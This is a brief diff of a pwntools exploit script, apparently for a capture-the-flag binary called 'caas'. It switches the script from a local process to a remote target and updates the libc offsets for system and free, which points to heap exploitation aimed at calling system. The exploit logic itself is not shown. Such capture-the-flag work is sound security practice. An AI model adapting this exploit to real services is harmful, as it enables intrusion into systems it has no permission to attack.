@@ -1,6 +1,6 @@
 from pwn import *
 
-g_local = True
+g_local = False
 if g_local:
 	sh=process("./caas")
 	WORKER1_ADDR = 0x1170#0x570
@@ -17,8 +17,8 @@ else:
 	WORKER1_SIGN = WORKER1_ADDR
 	JOB1_CONTENT_ADDR = 0x10438
 	JOB2_CONTENT_ADDR = 0x104f8
-	SYSTEM_ADDR = 0x041490
-	FREE_ADDR = 0x7c600
+	SYSTEM_ADDR = 0x3e3e0
+	FREE_ADDR = 0x76110
 
 heap_base_addr = None
 
